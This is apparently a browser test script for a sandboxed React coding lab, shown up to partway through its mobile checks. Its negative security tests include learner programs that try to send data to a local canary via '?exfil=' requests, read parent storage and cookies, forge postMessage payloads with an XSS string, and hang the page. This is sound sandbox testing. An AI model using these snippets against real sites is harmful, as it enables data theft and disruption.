/* eslint-disable @typescript-eslint/no-require-imports */
// ED-018 Coding Lab browser verification: functional behavior, error handling, negative security tests,
// keyboard use, responsive layouts and themes. Learner code is entered through the real editor.
// Usage: BASE=http://127.0.0.1:3118 node docs/ed-018/tools/verify-lab.cjs
const fs = require("node:fs");
const http = require("node:http");
const { chromium } = require(process.env.PLAYWRIGHT_CORE || "/home/joren/.cache/yarn/v6/npm-playwright-core-1.64.1-ca9ec82d7da6ced1b2326ec59ef097aaa9a29f94-integrity/node_modules/playwright-core");

const base = process.env.BASE || "http://127.0.0.1:3118";
const CANARY_PORT = 4802;
const canary = `http://127.0.0.1:${CANARY_PORT}`;
const route = "/practice/react/use-state-counter";
const report = { engine: "", base, startedAt: new Date().toISOString(), checks: [], canaryHits: [], observations: {}, errors: [] };
const check = (name, passed, evidence) => { report.checks.push({ name, passed: Boolean(passed), ...(evidence === undefined ? {} : { evidence }) }); if (!passed) console.log(`FAIL ${name}`, evidence ?? ""); };
const observe = (name, value) => { report.observations[name] = value; };

const solution = `import { useState } from "react";

export default function Counter() {
  const [count, setCount] = useState(0);
  return (
    <main>
      <p aria-live="polite">Count: {count}</p>
      <div>
        <button type="button" onClick={() => setCount(count - 1)}>Decrement</button>
        <button type="button" onClick={() => setCount(count + 1)}>Increment</button>
        <button type="button" onClick={() => setCount(0)}>Reset</button>
      </div>
    </main>
  );
}
`;

const programs = {
  renamed: solution.replace("Count: {count}", "Clicks: {count}"),
  syntax: 'export default function App() {\n  return <div>;\n}\n',
  unsupportedImport: 'import { useState } from "react";\nimport lodash from "lodash";\nexport default function App() { return <p>{String(lodash)}</p>; }\n',
  dynamicImport: 'export default function App() {\n  import("https://example.com/x.js");\n  return <p>never</p>;\n}\n',
  missingExport: "export function App() { return <p>named only</p>; }\n",
  typeErrorIgnored: 'export default function App() {\n  const count: number = "not a number" as unknown as number;\n  const label: string = 42 as unknown as string;\n  return <p>Types not checked: {count} {label}</p>;\n}\n',
  renderThrow: 'export default function App() {\n  const value = 1;\n  if (value) {\n    throw new Error("Boom from render");\n  }\n  return <p>unreachable</p>;\n}\n',
  eventThrow: 'export default function App() {\n  function handle() {\n    throw new TypeError("Handler failed");\n  }\n  return <button type="button" onClick={handle}>Break</button>;\n}\n',
  hookMisuse: 'import { useState } from "react";\nexport default function App() {\n  const [flag, setFlag] = useState(false);\n  if (flag) {\n    useState(1);\n  }\n  return <button type="button" onClick={() => setFlag(true)}>Toggle</button>;\n}\n',
  renderLoop: 'export default function App() {\n  let i = 0;\n  while (true) {\n    i++;\n  }\n  return <p>{i}</p>;\n}\n',
  clickLoop: 'export default function App() {\n  function spin() {\n    for (;;) {}\n  }\n  return <button type="button" onClick={spin}>Spin</button>;\n}\n',
  microtaskFlood: 'import { useEffect } from "react";\nexport default function App() {\n  useEffect(() => {\n    const spin = () => Promise.resolve().then(spin);\n    spin();\n  }, []);\n  return <p>flooding</p>;\n}\n',
  recursion: 'function down(n: number): number {\n  return down(n + 1);\n}\nexport default function App() {\n  return <p>{down(0)}</p>;\n}\n',
  memory: 'const chunks: number[][] = [];\nexport default function App() {\n  while (true) {\n    chunks.push(new Array(1_000_000).fill(1));\n  }\n}\n',
  regexHang: 'export default function App() {\n  const ok = /(a+)+$/.test("a".repeat(40) + "b");\n  return <p>{String(ok)}</p>;\n}\n',
  navigate: `import { useEffect } from "react";\nexport default function App() {\n  useEffect(() => {\n    location.href = "${canary}/?exfil=self-navigation";\n  }, []);\n  return <p>navigating</p>;\n}\n`,
  linkNavigate: `export default function App() {\n  return <a href="${canary}/?exfil=link-navigation" id="go">Go</a>;\n}\n`,
  alertAttempt: 'export default function App() {\n  alert("from preview");\n  const answer = confirm("ok?");\n  return <p id="dialog">confirm returned {String(answer)}</p>;\n}\n',
  attacks: `import { useEffect, useState } from "react";

type Row = [string, string];
const attempt = (name: string, run: () => unknown): Row => {
  try { return [name, "ALLOWED: " + String(run())]; } catch (error) { return [name, "blocked: " + (error as Error).name]; }
};
const settle = (name: string, promise: Promise<unknown>): Promise<Row> => promise.then((value) => [name, "ALLOWED: " + String(value)] as Row, (error) => [name, "blocked: " + String((error && (error as Error).name) || error)] as Row);

export default function Attacks() {
  const [rows, setRows] = useState<Row[]>(() => [
    attempt("origin", () => self.origin),
    attempt("parent.document", () => window.parent.document.title),
    attempt("parent.localStorage", () => window.parent.localStorage.getItem("explain-dev:v1:preferences")),
    attempt("own.localStorage", () => window.localStorage.getItem("explain-dev:v1:preferences")),
    attempt("sessionStorage", () => window.sessionStorage.length),
    attempt("document.cookie", () => document.cookie),
    attempt("parent.appState", () => (window.parent as unknown as { next: unknown }).next),
    attempt("parent.location.href", () => window.parent.location.href),
    attempt("top.navigation", () => { (window.top as Window).location.href = "/"; return "no error"; }),
    attempt("parent.history", () => { window.parent.history.back(); return "no error"; }),
    attempt("window.open", () => window.open("${canary}/?exfil=popup")),
    attempt("eval", () => eval("1 + 1")),
    attempt("Function", () => Function("return 1")()),
  ]);
  useEffect(() => {
    Promise.all([
      settle("fetch.external", fetch("${canary}/?exfil=fetch")),
      settle("fetch.app", fetch("/?exfil=fetch-app")),
      settle("xhr", new Promise((resolve, reject) => { const x = new XMLHttpRequest(); x.open("GET", "${canary}/?exfil=xhr"); x.onload = () => resolve(x.status); x.onerror = () => reject(new Error("XHRError")); x.send(); })),
      settle("websocket", new Promise((resolve, reject) => { const socket = new WebSocket("ws://127.0.0.1:${CANARY_PORT}/?exfil=ws"); socket.onopen = () => resolve("open"); socket.onerror = () => reject(new Error("WebSocketError")); })),
      settle("image", new Promise((resolve, reject) => { const image = new Image(); image.onload = () => resolve("loaded"); image.onerror = () => reject(new Error("ImageError")); image.src = "${canary}/?exfil=img"; })),
      settle("script", new Promise((resolve, reject) => { const script = document.createElement("script"); script.src = "${canary}/x.js?exfil=script"; script.onload = () => resolve("loaded"); script.onerror = () => reject(new Error("ScriptError")); document.head.append(script); })),
      settle("worker", new Promise((resolve, reject) => { const worker = new Worker(URL.createObjectURL(new Blob(["postMessage(1)"], { type: "text/javascript" }))); worker.onmessage = () => resolve("ran"); worker.onerror = () => reject(new Error("WorkerError")); })),
      settle("indexedDB", new Promise((resolve, reject) => { try { const request = indexedDB.open("x"); request.onsuccess = () => resolve("opened"); request.onerror = () => reject(request.error); } catch (error) { reject(error); } })),
      settle("beacon", Promise.resolve().then(() => navigator.sendBeacon("${canary}/?exfil=beacon", "x"))),
      settle("css.url", Promise.resolve().then(() => { const box = document.createElement("div"); box.style.backgroundImage = "url(${canary}/?exfil=css)"; document.body.append(box); return getComputedStyle(box).backgroundImage; })),
      settle("form", Promise.resolve().then(() => { const form = document.createElement("form"); form.action = "${canary}/?exfil=form"; form.method = "post"; document.body.append(form); form.submit(); return "submit() called"; })),
      settle("broadcast", Promise.resolve().then(() => { new BroadcastChannel("explain-dev").postMessage("from preview"); return "posted"; })),
    ]).then((later) => setTimeout(() => setRows((current) => [...current, ...later]), 1500));
  }, []);
  return <pre id="results">{JSON.stringify(rows)}</pre>;
}
`,
  forge: `export default function Forge() {
  const session = "00000000-0000-4000-8000-000000000000";
  const forged: unknown[] = [
    { channel: "explain-dev-lab", version: 1, type: "hello" },
    { channel: "explain-dev-lab", version: 1, session, runId: 1, type: "rendered" },
    { channel: "explain-dev-lab", version: 1, session, runId: 99, type: "runtime-error", kind: "render", diagnostic: { name: "Injected", message: "<img src=x onerror=alert(1)>" } },
    { channel: "explain-dev-lab", version: 1, type: "init", session, runId: 1, theme: "dark", file: { name: "App.tsx", code: "" } },
    "garbage",
    null,
    { huge: "x".repeat(200000) },
  ];
  for (const message of forged) window.parent.postMessage(message, "*");
  return <p id="forged">sent {forged.length}</p>;
}
`,
};

const ATTACK_EXPECTATIONS = {
  origin: /^ALLOWED: null$/,
  "parent.document": /^blocked: SecurityError$/,
  "parent.localStorage": /^blocked: SecurityError$/,
  "own.localStorage": /^blocked: SecurityError$/,
  sessionStorage: /^blocked: SecurityError$/,
  "document.cookie": /^blocked: SecurityError$/,
  "parent.appState": /^blocked: SecurityError$/,
  "parent.location.href": /^blocked: SecurityError$/,
  "top.navigation": /^blocked: SecurityError$/,
  "parent.history": /^blocked: SecurityError$/,
  "window.open": /^ALLOWED: null$/,
  eval: /^blocked: EvalError$/,
  Function: /^blocked: EvalError$/,
  "fetch.external": /^blocked: TypeError$/,
  "fetch.app": /^blocked: TypeError$/,
  xhr: /^blocked: /,
  websocket: /^blocked: /,
  image: /^blocked: /,
  script: /^blocked: /,
  worker: /^blocked: /,
  indexedDB: /^blocked: /,
  beacon: /./, // Return value is not meaningful; the canary must receive nothing.
  "css.url": /./, // Computed value only; the canary must receive nothing.
  form: /./, // The canary must receive nothing.
  broadcast: /./, // The parent must receive nothing.
};

const workspace = (page) => page.locator("[data-lab-workspace]");
const previewFrame = (page) => page.frameLocator('iframe[title="Preview of App.tsx"]');
const runId = async (page) => Number(await page.locator("[data-preview-frame]").getAttribute("data-run-id"));
const status = (page) => workspace(page).getAttribute("data-preview-status");

async function waitStatus(page, previousRunId, statuses, timeout = 20000) {
  await page.waitForFunction(([previous, wanted]) => {
    const frame = document.querySelector("[data-preview-frame]");
    const state = document.querySelector("[data-lab-workspace]")?.getAttribute("data-preview-status");
    return frame && Number(frame.getAttribute("data-run-id")) > previous && wanted.includes(state);
  }, [previousRunId, statuses], { timeout });
  return status(page);
}

async function setCode(page, code) {
  await page.locator(".cm-content").click();
  await page.keyboard.press("ControlOrMeta+a");
  await page.keyboard.insertText(code);
}

async function runProgram(page, code, statuses, timeout) {
  const previous = await runId(page);
  await setCode(page, code);
  await page.locator("[data-lab-run]").click();
  return waitStatus(page, previous, statuses, timeout);
}

async function problemsText(page) {
  const problems = page.locator("[data-lab-problems]");
  return (await problems.count()) ? problems.innerText() : "";
}

const startMonitor = (page) => page.evaluate(() => { window.__gap = { max: 0, last: performance.now() }; window.__gapTimer = setInterval(() => { const now = performance.now(); window.__gap.max = Math.max(window.__gap.max, now - window.__gap.last); window.__gap.last = now; }, 50); });
const stopMonitor = (page) => page.evaluate(() => { clearInterval(window.__gapTimer); return Math.round(window.__gap.max); });

async function rendererCpu(cdp) {
  try {
    const { processInfo } = await cdp.send("SystemInfo.getProcessInfo");
    return processInfo.filter((entry) => entry.type === "renderer").map((entry) => ({ id: entry.id, cpuTime: entry.cpuTime }));
  } catch (error) {
    return { unavailable: error.message };
  }
}

async function busyRenderersOver(cdp, ms) {
  const before = await rendererCpu(cdp);
  if (!Array.isArray(before)) return before;
  await new Promise((resolve) => setTimeout(resolve, ms));
  const after = await rendererCpu(cdp);
  return after.map((entry) => ({ id: entry.id, cpuSeconds: +(entry.cpuTime - (before.find((item) => item.id === entry.id)?.cpuTime ?? 0)).toFixed(2) })).filter((entry) => entry.cpuSeconds > 0.2);
}

async function parentState(page) {
  return page.evaluate(() => ({ url: location.href, title: document.title, preferences: localStorage.getItem("explain-dev:v1:preferences"), theme: localStorage.getItem("theme"), cookie: document.cookie, iframes: document.querySelectorAll("iframe").length }));
}

async function newPage(browser, { width = 1440, theme = "dark", hasTouch = false } = {}) {
  const context = await browser.newContext({ viewport: { width, height: 900 }, reducedMotion: "reduce", hasTouch });
  await context.addInitScript((theme) => {
    // Init scripts run in every frame; the sandboxed preview must not (and cannot) touch storage.
    if (window.top !== window) return;
    // Parent-document errors only; Playwright's pageerror also reports errors thrown inside the preview frame.
    window.__parentErrors = [];
    window.addEventListener("error", (event) => window.__parentErrors.push(String(event.message)));
    window.addEventListener("unhandledrejection", (event) => window.__parentErrors.push(String(event.reason)));
    localStorage.setItem("theme", theme);
    if (!localStorage.getItem("explain-dev:v1:preferences")) localStorage.setItem("explain-dev:v1:preferences", '{"version":1,"bookmarkedTopicIds":["preserve"],"readTopicIds":["preserve"]}');
  }, theme);
  const page = await context.newPage();
  page.setDefaultTimeout(20000);
  const events = { dialogs: 0, popups: 0, consoleErrors: [], pageErrors: [], requests: [], sent: [], blocked: [] };
  page.on("dialog", (dialog) => { events.dialogs++; dialog.dismiss(); });
  context.on("page", () => { events.popups++; });
  page.on("console", (message) => { if (message.type() === "error") events.consoleErrors.push({ text: message.text().slice(0, 300), frame: message.location()?.url ?? "" }); });
  page.on("pageerror", (error) => events.pageErrors.push(error.message));
  page.on("request", (request) => events.requests.push({ url: request.url(), frame: request.frame()?.url() ?? "" }));
  page.on("requestfinished", (request) => events.sent.push({ url: request.url(), frame: request.frame()?.url() ?? "" }));
  page.on("requestfailed", (request) => events.blocked.push({ url: request.url(), frame: request.frame()?.url() ?? "", error: request.failure()?.errorText }));
  return { context, page, events };
}

async function openChallenge(page) {
  const response = await page.goto(base + route, { waitUntil: "networkidle" });
  await waitStatus(page, 0, ["ready"]);
  return response;
}

function startCanary() {
  const describe = (request, method) => ({ method, url: request.url, at: Date.now(), userAgent: request.headers["user-agent"], remote: request.socket.remoteAddress, dest: request.headers["sec-fetch-dest"], mode: request.headers["sec-fetch-mode"], site: request.headers["sec-fetch-site"], referer: request.headers.referer });
  const server = http.createServer((request, response) => { report.canaryHits.push(describe(request, request.method)); response.end("canary"); });
  server.on("upgrade", (request, socket) => { report.canaryHits.push(describe(request, "UPGRADE")); socket.destroy(); });
  return new Promise((resolve) => server.listen(CANARY_PORT, "127.0.0.1", () => resolve(server)));
}

(async () => {
  const server = await startCanary();
  const browser = await chromium.launch({ executablePath: process.env.CHROME_PATH || "/home/joren/.cache/ms-playwright/chromium-1248/chrome-linux64/chrome" });
  report.engine = `Chromium ${browser.version()} (headless, full build)`;
  const cdp = await browser.newBrowserCDPSession();
  fs.mkdirSync("docs/ed-018/screenshots", { recursive: true });
  try {
    // ---------- Functional behavior and error handling (desktop, dark) ----------
    {
      const { context, page, events } = await newPage(browser);
      const response = await openChallenge(page);
      check("challenge route returns 200", response.status() === 200);
      const initial = await parentState(page);
      const frame = page.locator('iframe[title="Preview of App.tsx"]');
      check("iframe sandbox is exactly allow-scripts", (await frame.getAttribute("sandbox")) === "allow-scripts");
      check("iframe source is the preview document", (await frame.getAttribute("src")) === "/lab-runtime/preview.html");
      check("iframe sends no referrer", (await frame.getAttribute("referrerpolicy")) === "no-referrer");
      check("starter initially renders Count: 0", (await previewFrame(page).locator("p").textContent()) === "Count: 0");
      await previewFrame(page).getByRole("button", { name: "Increment" }).click();
      check("starter TODO handlers do not change the count", (await previewFrame(page).locator("p").textContent()) === "Count: 0");
      check("preview theme follows the app (dark)", (await previewFrame(page).locator("html").getAttribute("data-theme")) === "dark");

      await setCode(page, solution);
      check("editing marks the preview as outdated", (await page.locator("[data-lab-status]").innerText()).includes("Code changed. Run to update the preview."));
      let previous = await runId(page);
      await page.locator(".cm-content").press("ControlOrMeta+Enter");
      check("Ctrl/Cmd+Enter in the editor runs the code", await waitStatus(page, previous, ["ready"]) === "ready");
      const counter = previewFrame(page);
      const sequence = [];
      for (const label of ["Increment", "Increment", "Decrement", "Reset", "Decrement"]) {
        await counter.getByRole("button", { name: label }).click();
        sequence.push(await counter.locator("p").textContent());
      }
      check("learner solution is executed: increment, decrement and reset work", JSON.stringify(sequence) === JSON.stringify(["Count: 1", "Count: 2", "Count: 1", "Count: 0", "Count: -1"]), sequence);

      check("edited text changes the rendered preview", await runProgram(page, programs.renamed, ["ready"]) === "ready" && (await previewFrame(page).locator("p").textContent()) === "Clicks: 0");
      await page.screenshot({ path: "docs/ed-018/screenshots/edited-preview-1440-dark.png" });

      previous = await runId(page);
      await page.locator("[data-lab-reset]").click();
      await waitStatus(page, previous, ["ready"]);
      const afterReset = await page.locator(".cm-content").innerText();
      check("Reset restores the starter code and re-runs it", afterReset.includes("TODO: Replace this constant") && (await previewFrame(page).locator("p").textContent()) === "Count: 0");
      check("Reset explains how to undo", (await page.locator("[data-lab-notice]").innerText()).includes("Ctrl+Z"));
      await page.locator(".cm-content").click();
      await page.keyboard.press("ControlOrMeta+z");
      check("one undo after Reset restores exactly the replaced code", (await page.locator(".cm-content").innerText()).includes("Clicks: {count}"));

      // Compile-time errors
      check("JSX syntax error is reported as a compile error", await runProgram(page, programs.syntax, ["compile-error"]) === "compile-error");
      let problems = await problemsText(page);
      check("syntax error shows message, line and code frame", /SyntaxError:/.test(problems) && /Line 2, column \d+/.test(problems) && problems.includes("return <div>;"), problems);
      check("compile error removes the preview frame", await page.locator('iframe[title="Preview of App.tsx"]').count() === 0);
      await page.screenshot({ path: "docs/ed-018/screenshots/compile-error-1440-dark.png" });
      await setCode(page, solution);
      previous = await runId(page);
      await page.getByRole("button", { name: "Run again" }).click();
      check("compile errors are recoverable with Run again", await waitStatus(page, previous, ["ready"]) === "ready");

      check("unsupported import is rejected", await runProgram(page, programs.unsupportedImport, ["compile-error"]) === "compile-error" && (await problemsText(page)).includes('"lodash" can\'t be imported in the Coding Lab'));
      check("dynamic import is rejected", await runProgram(page, programs.dynamicImport, ["compile-error"]) === "compile-error" && (await problemsText(page)).includes("Dynamic import() is not available"));
      check("missing default export is explained", await runProgram(page, programs.missingExport, ["compile-error"]) === "compile-error" && (await problemsText(page)).includes("Export your component as the default export"));
      check("TypeScript type errors are not reported (documented limitation)", await runProgram(page, programs.typeErrorIgnored, ["ready"]) === "ready" && (await previewFrame(page).locator("p").textContent()).includes("Types not checked"));

      // Runtime errors
      check("render exception is reported as a runtime error", await runProgram(page, programs.renderThrow, ["runtime-error"]) === "runtime-error");
      problems = await problemsText(page);
      check("render error shows kind, message, source line and component stack", problems.includes("WHILE RENDERING") && problems.includes("Error: Boom from render") && problems.includes("Line 4") && /at App/.test(problems), problems);
      await page.screenshot({ path: "docs/ed-018/screenshots/runtime-error-1440-dark.png" });

      check("event handler program renders", await runProgram(page, programs.eventThrow, ["ready"]) === "ready");
      await previewFrame(page).getByRole("button", { name: "Break" }).click();
      await page.waitForFunction(() => document.querySelector("[data-lab-workspace]")?.getAttribute("data-preview-status") === "runtime-error");
      problems = await problemsText(page);
      check("event handler error is reported and the preview stays usable", problems.includes("IN AN EVENT HANDLER OR TIMER") && problems.includes("TypeError: Handler failed") && problems.includes("Line 3") && await previewFrame(page).getByRole("button", { name: "Break" }).isVisible(), problems);

      check("hook misuse program renders", await runProgram(page, programs.hookMisuse, ["ready"]) === "ready");
      await previewFrame(page).getByRole("button", { name: "Toggle" }).click();
      await page.waitForFunction(() => document.querySelector("[data-lab-workspace]")?.getAttribute("data-preview-status") === "runtime-error");
      problems = await problemsText(page);
      check("React development errors are meaningful (Rules of Hooks)", /Rendered more hooks than during the previous render/.test(problems), problems);

      check("unbounded recursion is reported as RangeError", await runProgram(page, programs.recursion, ["runtime-error"]) === "runtime-error" && /RangeError: Maximum call stack size exceeded/.test(await problemsText(page)));

      // Nontermination
      for (const [name, program] of [["infinite render loop", programs.renderLoop], ["endless microtask chain", programs.microtaskFlood]]) {
        await startMonitor(page);
        const started = Date.now();
        const result = await runProgram(page, program, ["stopped"], 20000);
        const gap = await stopMonitor(page);
        problems = await problemsText(page);
        check(`${name} is stopped by the execution guard`, result === "stopped" && problems.includes("more than one second without pausing"), { problems, elapsedMs: Date.now() - started });
        check(`${name}: preview frame removed`, await page.locator('iframe[title="Preview of App.tsx"]').count() === 0);
        check(`${name}: parent stays responsive`, gap < 500, { maxParentTimerGapMs: gap });
      }
      await page.screenshot({ path: "docs/ed-018/screenshots/loop-stopped-1440-dark.png" });

      check("click-handler loop program renders", await runProgram(page, programs.clickLoop, ["ready"]) === "ready");
      await startMonitor(page);
      await previewFrame(page).getByRole("button", { name: "Spin" }).click();
      await page.waitForFunction(() => document.querySelector("[data-lab-workspace]")?.getAttribute("data-preview-status") === "stopped", null, { timeout: 15000 });
      check("infinite loop in an event handler is stopped", (await problemsText(page)).includes("more than one second"), { maxParentTimerGapMs: await stopMonitor(page) });

      // Uninstrumented blocking (regular-expression backtracking) and memory exhaustion
      for (const [name, program] of [["catastrophic regex (uninstrumented)", programs.regexHang], ["unbounded memory allocation", programs.memory]]) {
        await startMonitor(page);
        const started = Date.now();
        const result = await runProgram(page, program, ["stopped", "runtime-error"], 30000);
        const gap = await stopMonitor(page);
        const text = await problemsText(page);
        const busy = await busyRenderersOver(cdp, 2000);
        observe(name, { status: result, elapsedMs: Date.now() - started, maxParentTimerGapMs: gap, problems: text.split("\n").slice(0, 3).join(" | "), renderersBusyAfterRemoval: busy });
        check(`${name}: contained and reported without crashing the app`, ["stopped", "runtime-error"].includes(result) && await page.locator("[data-lab-workspace]").isVisible());
        check(`${name}: parent stays responsive (Chromium site isolation)`, gap < 1000, { maxParentTimerGapMs: gap });
      }

      // Navigation attempts
      const hitsBefore = report.canaryHits.length;
      check("self-navigation is detected and the preview removed", await runProgram(page, programs.navigate, ["stopped"]) === "stopped" && (await problemsText(page)).includes("Navigation is disabled"));
      await page.waitForTimeout(500);
      observe("self-navigation canary requests", report.canaryHits.slice(hitsBefore));
      check("link navigation program renders", await runProgram(page, programs.linkNavigate, ["ready"]) === "ready");
      await previewFrame(page).locator("#go").click();
      await page.waitForFunction(() => document.querySelector("[data-lab-workspace]")?.getAttribute("data-preview-status") === "stopped");
      check("link navigation inside the preview is detected", (await problemsText(page)).includes("Navigation is disabled"));
      check("top-level page never navigated", (await parentState(page)).url === initial.url);

      check("alert/confirm program renders", await runProgram(page, programs.alertAttempt, ["ready"]) === "ready");
      check("modal dialogs are blocked in the preview", events.dialogs === 0 && (await previewFrame(page).locator("#dialog").textContent()) === "confirm returned false", { dialogs: events.dialogs });

      // Parent access, network, storage and execution attempts
      const attackHitsBefore = report.canaryHits.length;
      await page.evaluate(() => { window.__broadcast = []; const channel = new BroadcastChannel("explain-dev"); channel.onmessage = (event) => window.__broadcast.push(event.data); });
      check("attack program renders", await runProgram(page, programs.attacks, ["ready"]) === "ready");
      await previewFrame(page).locator("#results").filter({ hasText: "fetch.external" }).waitFor({ timeout: 15000 });
      const rows = Object.fromEntries(JSON.parse(await previewFrame(page).locator("#results").textContent()));
      observe("attack results", rows);
      for (const [name, pattern] of Object.entries(ATTACK_EXPECTATIONS)) check(`attack blocked: ${name}`, pattern.test(rows[name] ?? ""), rows[name]);
      await page.waitForTimeout(1000);
      check("no attack request reached the canary server", report.canaryHits.length === attackHitsBefore, report.canaryHits.slice(attackHitsBefore));
      check("BroadcastChannel does not reach the parent", (await page.evaluate(() => window.__broadcast.length)) === 0);
      const previewSent = events.sent.filter((request) => request.frame.includes("/lab-runtime/preview.html") && !request.url.startsWith("blob:")).map((request) => request.url.replace(base, ""));
      check("preview frame only loaded its own document, stylesheet and runtime", previewSent.every((url) => ["/lab-runtime/preview.html", "/lab-runtime/preview.css", "/lab-runtime/runtime.js"].includes(url)), [...new Set(previewSent)]);
      observe("requests attempted by the preview and blocked by the browser", events.blocked.filter((request) => request.frame.includes("/lab-runtime/preview.html")).map((request) => `${request.url} (${request.error})`));
      check("no popup windows were opened", events.popups === 0);

      // Forged and foreign messages
      check("forging program renders", await runProgram(page, programs.forge, ["ready"]) === "ready");
      await page.waitForTimeout(500);
      const rejected = Number(await page.locator("[data-preview-frame]").getAttribute("data-rejected-messages"));
      check("forged postMessage payloads from the preview are rejected", rejected === 7 && await status(page) === "ready" && (await problemsText(page)) === "", { rejected });
      const beforeForeign = { run: await runId(page), status: await status(page) };
      await page.evaluate(() => {
        const session = "00000000-0000-4000-8000-000000000000";
        window.postMessage({ channel: "explain-dev-lab", version: 1, type: "hello" }, "*");
        window.postMessage({ channel: "explain-dev-lab", version: 1, session, runId: 1, type: "runtime-error", kind: "render", diagnostic: { name: "Foreign", message: "from the parent window" } }, "*");
        const intruder = document.createElement("iframe");
        intruder.id = "intruder";
        intruder.srcdoc = `<script>parent.postMessage({ channel: "explain-dev-lab", version: 1, type: "hello" }, "*"); parent.postMessage({ channel: "explain-dev-lab", version: 1, session: "${session}", runId: 1, type: "compile-error", kind: "syntax", diagnostic: { name: "Foreign", message: "from another frame" } }, "*");<\/script>`;
        document.body.append(intruder);
      });
      await page.waitForTimeout(800);
      check("messages from other windows and frames are ignored", await runId(page) === beforeForeign.run && await status(page) === beforeForeign.status && !(await page.locator("body").innerText()).includes("Foreign"));
      await page.evaluate(() => document.getElementById("intruder")?.remove());
      check("no injected markup reached the parent DOM", (await page.locator("[data-lab-workspace] img").count()) === 0 && events.dialogs === 0);

      // Parent state is untouched by everything above
      const finalState = await parentState(page);
      check("parent URL, title, preferences, theme and cookies are unchanged", finalState.url === initial.url && finalState.title === initial.title && finalState.preferences === initial.preferences && finalState.theme === initial.theme && finalState.cookie === initial.cookie, { initial, finalState });

      // Resource disposal across many runs
      await setCode(page, solution);
      const heap = async () => (await page.evaluate(() => (performance.memory ? performance.memory.usedJSHeapSize : null)));
      await page.evaluate(() => window.gc?.());
      const heapBefore = await heap();
      for (let index = 0; index < 15; index++) {
        previous = await runId(page);
        await page.locator("[data-lab-run]").click();
        await waitStatus(page, previous, ["ready"]);
      }
      check("only one preview frame exists after 15 runs", (await parentState(page)).iframes === 1);
      observe("parent JS heap before/after 15 runs (bytes, approximate)", { before: heapBefore, after: await heap() });

      // Theme switching is sent over the port without re-running
      const themeRun = await runId(page);
      await page.getByRole("button", { name: /theme/i }).first().click();
      await page.waitForFunction(() => document.documentElement.classList.contains("light"));
      await page.waitForTimeout(300);
      check("theme change updates the running preview without a re-run", (await previewFrame(page).locator("html").getAttribute("data-theme")) === "light" && await runId(page) === themeRun);

      const parentErrors = await page.evaluate(() => window.__parentErrors);
      check("no uncaught errors in the parent document", parentErrors.length === 0, parentErrors);
      observe("errors thrown inside the preview frame (expected learner errors)", events.pageErrors);
      observe("parent console errors (preview-originated messages are expected)", events.consoleErrors.slice(0, 40));
      await context.close();
    }

    // ---------- Direct access to the preview document ----------
    {
      const { context, page } = await newPage(browser);
      await page.goto(base + "/lab-runtime/preview.html");
      await page.waitForTimeout(500);
      const direct = await page.evaluate(() => { let storage; try { localStorage.getItem("x"); storage = "accessible"; } catch (error) { storage = error.name; } return { origin: self.origin, storage, text: document.body.innerText }; });
      check("preview opened directly is still sandboxed (CSP sandbox)", direct.origin === "null" && direct.storage === "SecurityError", direct);
      check("runtime refuses to run outside the Coding Lab frame", direct.text.includes("Open the Coding Lab to use this preview."), direct.text);
      await context.close();
    }

    // ---------- Keyboard and navigation (desktop) ----------
    {
      const { context, page, events } = await newPage(browser);
      await openChallenge(page);
      await page.locator("[data-lab-run]").focus();
      await page.keyboard.press("Tab");
      check("Tab moves from Run to Reset", await page.evaluate(() => document.activeElement?.hasAttribute("data-lab-reset")));
      await page.keyboard.press("Tab");
      check("Tab then reaches the code editor", await page.evaluate(() => document.activeElement?.classList.contains("cm-content")));
      check("editor has an accessible name and help text", (await page.locator(".cm-content").getAttribute("aria-label")) === "App.tsx code editor" && Boolean(await page.locator(".cm-content").getAttribute("aria-describedby")));
      await page.keyboard.press("ControlOrMeta+Home");
      const before = await page.locator(".cm-content").innerText();
      await page.keyboard.press("Tab");
      const after = await page.locator(".cm-content").innerText();
      check("Tab inside the editor indents instead of moving focus", after !== before && await page.evaluate(() => document.activeElement?.classList.contains("cm-content")));
      await page.keyboard.press("Escape");
      await page.keyboard.press("Tab");
      check("Escape then Tab leaves the editor (no keyboard trap)", await page.evaluate(() => !document.activeElement?.closest(".cm-editor")), await page.evaluate(() => document.activeElement?.tagName));
      check("visible focus indicator on Run", await page.locator("[data-lab-run]").evaluate((element) => { element.focus(); return getComputedStyle(element).boxShadow !== "none" || getComputedStyle(element).outlineStyle !== "none"; }));

      await page.goto(base + "/practice", { waitUntil: "networkidle" });
      const sidebar = page.getByRole("complementary", { name: "Learning sidebar" });
      check("Practice link is current on /practice", (await sidebar.locator("[data-practice-link]").getAttribute("aria-current")) === "page");
      await page.getByRole("link", { name: "Build a Counter" }).click();
      await waitStatus(page, 0, ["ready"]);
      check("Practice link marks the challenge as a descendant location", (await sidebar.locator("[data-practice-link]").getAttribute("aria-current")) === "location");
      await setCode(page, solution);
      await sidebar.getByRole("link", { name: /Home/ }).click();
      await page.waitForURL(base + "/");
      check("navigating away removes the preview", await page.locator("iframe").count() === 0);
      await page.goBack();
      await waitStatus(page, 0, ["ready"]);
      check("returning starts a fresh session with the starter code (drafts are not persisted)", (await page.locator(".cm-content").innerText()).includes("TODO: Replace this constant"));
      check("no uncaught errors during navigation", events.pageErrors.length === 0 && (await page.evaluate(() => window.__parentErrors)).length === 0, events.pageErrors);
      await context.close();
    }

    // ---------- Mobile tabbed workspace ----------
    {
      const { context, page } = await newPage(browser, { width: 375, hasTouch: true });
      await openChallenge(page);
      const tabs = page.getByRole("tablist", { name: "Workspace views" });
      check("mobile shows a Code/Preview tablist", await tabs.isVisible() && await tabs.getByRole("tab").count() === 2);
      check("code tab is selected first", (await tabs.getByRole("tab", { name: "Code" }).getAttribute("aria-selected")) === "true" && await page.locator('[data-lab-panel="preview"]').isHidden());
      await setCode(page, solution.replace("Count: {count}", "Mobile: {count}"));
      await tabs.getByRole("tab", { name: "Code" }).focus();
      await page.keyboard.press("ArrowRight");
      check("ArrowRight selects and focuses the Preview tab", (await tabs.getByRole("tab", { name: "Preview" }).getAttribute("aria-selected")) === "true" && await page.evaluate(() => document.activeElement?.getAttribute("role") === "tab" && document.activeElement.textContent.startsWith("Preview")));
      await page.keyboard.press("Home");
      check("switching views keeps the edited code", (await page.locator(".cm-content").innerText()).includes("Mobile: {count}"));
      const previous = await runId(page);
      await page.locator("[data-lab-run]").click();
      await waitStatus(page, previous, ["ready"]);
      check("Run on mobile shows the preview with the edited code", (await tabs.getByRole("tab", { name: "Preview" }).getAttribute("aria-selected")) === "true" && (await previewFrame(page).locator("p").textContent()) === "Mobile: 0");
      await previewFrame(page).getByRole("button", { name: "Increment" }).tap();
      check("touch interaction works inside the preview", (await previewFrame(page).locator("p").textContent()) === "Mobile: 1");
